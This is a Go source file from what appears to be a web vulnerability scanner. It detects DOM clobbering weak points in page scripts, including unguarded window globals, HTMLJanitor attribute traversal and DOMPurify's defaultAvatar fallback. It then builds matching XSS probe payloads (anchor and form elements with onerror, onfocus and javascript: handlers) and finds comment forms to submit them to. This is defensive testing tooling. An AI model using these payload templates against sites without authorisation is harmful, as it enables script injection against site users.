package detection

import (
	"net/url"
	"regexp"
	"strings"

	"golang.org/x/net/html"
)

// DOMClobberingKind classifies a statically detected DOM clobbering surface.
type DOMClobberingKind string

const (
	// DOMClobberGlobalProperty is an unguarded window.<Global>.<Property> or
	// (window.<Global> || { <Property>: ... }) read that an <a id=Global><a
	// id=Global name=Property ...> pair can clobber.
	DOMClobberGlobalProperty DOMClobberingKind = "global_property"

	// DOMClobberGlobalValue is an unguarded window.<Global> || ... fallback
	// where the global itself is coerced to string (e.g. <a id=Global href=...>).
	DOMClobberGlobalValue DOMClobberingKind = "global_value"

	// DOMClobberSanitizerAttr is a DOM sanitizer / filter (such as HTMLJanitor)
	// whose DOM-node traversal reads .attributes and can be clobbered by a child
	// element with id=attributes.
	DOMClobberSanitizerAttr DOMClobberingKind = "sanitizer_attributes"

	// DOMClobberDOMPurifyAvatar is a DOMPurify-sanitized comment renderer that
	// falls back to window.defaultAvatar.avatar.
	DOMClobberDOMPurifyAvatar DOMClobberingKind = "dompurify_default_avatar"
)

// DOMClobberingSurface describes one clobberable global or DOM-attribute
// pattern discovered in a page's HTML or scripts.
type DOMClobberingSurface struct {
	Kind         DOMClobberingKind
	GlobalName   string
	PropertyName string
	Sanitizer    string
}

// DOMClobberingPayloadSpec is a single deterministic clobbering payload and
// optional URL fragment (used to trigger focus-based handlers).
type DOMClobberingPayloadSpec struct {
	Kind     DOMClobberingKind
	Payload  string
	Fragment string
}

// DOMClobberingForm describes a parsed HTML form that can accept user-supplied
// HTML (e.g. a comment or profile bio form).
type DOMClobberingForm struct {
	Action       string
	Method       string
	TextField    string
	HiddenFields map[string]string
	ExtraFields  map[string]string
}

var (
	// Matches: window.foo || { bar: ... } or (window.foo || { bar: ... })
	reClobberWindowOrObj = regexp.MustCompile(`\b(?:window|globalThis|self)\.([A-Za-z_$][A-Za-z0-9_$]*)\s*\|\|\s*\{\s*([A-Za-z_$][A-Za-z0-9_$]*)\s*:`)
	// Matches: window.foo && window.foo.bar
	reClobberWindowAndProp = regexp.MustCompile(`\b(?:window|globalThis|self)\.([A-Za-z_$][A-Za-z0-9_$]*)\s*&&\s*(?:window|globalThis|self)\.([A-Za-z_$][A-Za-z0-9_$]*)\.([A-Za-z_$][A-Za-z0-9_$]*)`)
	// Matches: (window.foo || {}).bar
	reClobberWindowParenProp = regexp.MustCompile(`\(\s*(?:window|globalThis|self)\.([A-Za-z_$][A-Za-z0-9_$]*)\s*\|\|\s*\{\s*\}\s*\)\.([A-Za-z_$][A-Za-z0-9_$]*)`)
	// Matches: window.foo || 'default' / "default"
	reClobberWindowOrString = regexp.MustCompile(`\b(?:window|globalThis|self)\.([A-Za-z_$][A-Za-z0-9_$]*)\s*\|\|\s*['"\x60]`)
)

var clobberingBuiltinGlobals = map[string]bool{
	"location": true, "document": true, "history": true, "navigator": true,
	"localStorage": true, "sessionStorage": true, "console": true,
	"Math": true, "JSON": true, "Object": true, "Array": true,
	"String": true, "Number": true, "Boolean": true, "Promise": true,
	"fetch": true, "URL": true, "URLSearchParams": true, "Error": true,
	"RegExp": true, "Date": true, "DOMPurify": true, "HTMLJanitor": true,
	"jQuery": true, "$": true, "angular": true, "window": true,
	"self": true, "globalThis": true, "top": true, "parent": true,
	"frames": true, "opener": true, "event": true,
}

// DetectDOMClobberingSurfaces inspects html and same-origin scripts for
// clobberable global fallbacks and known sanitizer-attribute clobbering
// patterns.
func DetectDOMClobberingSurfaces(htmlContent string, scripts []DOMXSSExternalScript) []DOMClobberingSurface {
	var out []DOMClobberingSurface
	seen := make(map[string]struct{})
	add := func(s DOMClobberingSurface) {
		key := string(s.Kind) + "|" + s.GlobalName + "|" + s.PropertyName + "|" + s.Sanitizer
		if _, ok := seen[key]; ok {
			return
		}
		seen[key] = struct{}{}
		out = append(out, s)
	}

	var scriptBodies []string
	for _, s := range scripts {
		if !s.Unavailable() {
			scriptBodies = append(scriptBodies, s.Body)
		}
	}
	combined := htmlContent + "\n" + strings.Join(scriptBodies, "\n")
	low := strings.ToLower(combined)

	sanitizer := ""
	if strings.Contains(low, "dompurify") {
		sanitizer = "dompurify"
	} else if strings.Contains(low, "htmljanitor") {
		sanitizer = "htmljanitor"
	}

	if sanitizer == "htmljanitor" {
		add(DOMClobberingSurface{
			Kind:         DOMClobberSanitizerAttr,
			PropertyName: "attributes",
			Sanitizer:    "htmljanitor",
		})
	}
	if sanitizer == "dompurify" && strings.Contains(low, "defaultavatar") {
		add(DOMClobberingSurface{
			Kind:         DOMClobberDOMPurifyAvatar,
			GlobalName:   "defaultAvatar",
			PropertyName: "avatar",
			Sanitizer:    "dompurify",
		})
	}

	for _, m := range reClobberWindowOrObj.FindAllStringSubmatch(combined, -1) {
		if clobberingBuiltinGlobals[m[1]] {
			continue
		}
		add(DOMClobberingSurface{
			Kind:         DOMClobberGlobalProperty,
			GlobalName:   m[1],
			PropertyName: m[2],
			Sanitizer:    sanitizer,
		})
	}
	for _, m := range reClobberWindowAndProp.FindAllStringSubmatch(combined, -1) {
		if m[1] != m[2] || clobberingBuiltinGlobals[m[1]] {
			continue
		}
		add(DOMClobberingSurface{
			Kind:         DOMClobberGlobalProperty,
			GlobalName:   m[1],
			PropertyName: m[3],
			Sanitizer:    sanitizer,
		})
	}
	for _, m := range reClobberWindowParenProp.FindAllStringSubmatch(combined, -1) {
		if clobberingBuiltinGlobals[m[1]] {
			continue
		}
		add(DOMClobberingSurface{
			Kind:         DOMClobberGlobalProperty,
			GlobalName:   m[1],
			PropertyName: m[2],
			Sanitizer:    sanitizer,
		})
	}
	for _, m := range reClobberWindowOrString.FindAllStringSubmatch(combined, -1) {
		if clobberingBuiltinGlobals[m[1]] {
			continue
		}
		add(DOMClobberingSurface{
			Kind:       DOMClobberGlobalValue,
			GlobalName: m[1],
			Sanitizer:  sanitizer,
		})
	}

	return out
}

// DOMClobberingPayloadsFor returns the bounded clobbering payload specs for a
// detected surface.
func DOMClobberingPayloadsFor(surface DOMClobberingSurface, marker string) []DOMClobberingPayloadSpec {
	if !validDOMXSSMarker(marker) {
		return nil
	}
	switch surface.Kind {
	case DOMClobberSanitizerAttr:
		id := "x" + marker
		return []DOMClobberingPayloadSpec{{
			Kind:     DOMClobberSanitizerAttr,
			Payload:  `<form id=` + id + ` tabindex=0 onfocus=` + marker + `><input id=attributes>`,
			Fragment: "#" + id,
		}}
	case DOMClobberDOMPurifyAvatar:
		return []DOMClobberingPayloadSpec{{
			Kind:    DOMClobberDOMPurifyAvatar,
			Payload: `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=` + marker + `//">`,
		}}
	case DOMClobberGlobalProperty:
		if surface.GlobalName == "" || surface.PropertyName == "" {
			return nil
		}
		specs := []DOMClobberingPayloadSpec{{
			Kind:    DOMClobberGlobalProperty,
			Payload: `<a id=` + surface.GlobalName + `><a id=` + surface.GlobalName + ` name=` + surface.PropertyName + ` href="cid:&quot;onerror=` + marker + `//">`,
		}}
		lowProp := strings.ToLower(surface.PropertyName)
		if lowProp == "url" || lowProp == "src" || lowProp == "href" || strings.HasSuffix(lowProp, "url") || strings.HasSuffix(lowProp, "src") {
			specs = append(specs, DOMClobberingPayloadSpec{
				Kind:    DOMClobberGlobalProperty,
				Payload: `<a id=` + surface.GlobalName + `><a id=` + surface.GlobalName + ` name=` + surface.PropertyName + ` href="javascript:` + marker + `">`,
			})
		}
		return specs
	case DOMClobberGlobalValue:
		if surface.GlobalName == "" {
			return nil
		}
		return []DOMClobberingPayloadSpec{
			{
				Kind:    DOMClobberGlobalValue,
				Payload: `<a id=` + surface.GlobalName + ` href="cid:&quot;onerror=` + marker + `//">`,
			},
			{
				Kind:    DOMClobberGlobalValue,
				Payload: `<a id=` + surface.GlobalName + ` href="javascript:` + marker + `">`,
			},
		}
	default:
		return nil
	}
}

// ExtractDOMClobberingForms parses HTML forms that expose a textarea or text
// input suitable for submitting a clobbering payload.
func ExtractDOMClobberingForms(htmlContent, pageURL string) []DOMClobberingForm {
	doc, err := html.Parse(strings.NewReader(htmlContent))
	if err != nil {
		return nil
	}
	base, _ := url.Parse(pageURL)
	var forms []DOMClobberingForm
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "form" {
			if f, ok := parseClobberingForm(n, base); ok {
				forms = append(forms, f)
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)
	return forms
}

func parseClobberingForm(formNode *html.Node, base *url.URL) (DOMClobberingForm, bool) {
	action := attrVal(formNode, "action")
	method := strings.ToUpper(strings.TrimSpace(attrVal(formNode, "method")))
	if method == "" {
		method = "GET"
	}
	if base != nil {
		if ref, err := url.Parse(action); err == nil {
			action = base.ResolveReference(ref).String()
		}
	}
	hidden := make(map[string]string)
	extra := make(map[string]string)
	var textField string
	var walkInputs func(*html.Node)
	walkInputs = func(n *html.Node) {
		if n.Type == html.ElementNode {
			switch n.Data {
			case "textarea":
				if name := attrVal(n, "name"); name != "" && textField == "" {
					textField = name
				}
			case "input":
				name := attrVal(n, "name")
				if name != "" {
					typ := strings.ToLower(attrVal(n, "type"))
					val := attrVal(n, "value")
					switch typ {
					case "hidden":
						hidden[name] = val
					case "submit", "button", "reset", "file", "image":
					case "email":
						extra[name] = "indago@example.com"
					case "url":
						extra[name] = "https://example.com"
					default:
						lowName := strings.ToLower(name)
						if textField == "" && (lowName == "comment" || lowName == "message" || lowName == "body" || lowName == "content" || lowName == "bio") {
							textField = name
						} else if val != "" {
							extra[name] = val
						} else {
							extra[name] = "indago"
						}
					}
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walkInputs(c)
		}
	}
	walkInputs(formNode)
	if textField == "" || method != "POST" {
		return DOMClobberingForm{}, false
	}
	return DOMClobberingForm{
		Action:       action,
		Method:       method,
		TextField:    textField,
		HiddenFields: hidden,
		ExtraFields:  extra,
	}, true
}

func attrVal(n *html.Node, key string) string {
	for _, a := range n.Attr {
		if strings.EqualFold(a.Key, key) {
			return a.Val
		}
	}
	return ""
}
